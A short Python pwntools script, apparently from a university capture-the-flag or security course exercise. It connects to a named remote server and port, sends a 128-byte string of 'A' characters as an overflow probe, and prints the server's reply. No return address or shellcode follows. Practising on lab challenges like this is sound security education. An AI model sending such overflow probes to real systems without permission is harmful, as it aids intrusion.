from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22161"


r = remote(SERVER,PORT)

msg = (b"A"*0x80)
r.sendline(msg)

print(f"Message server sent:\n{r.recvline().decode()}\n")

r.close()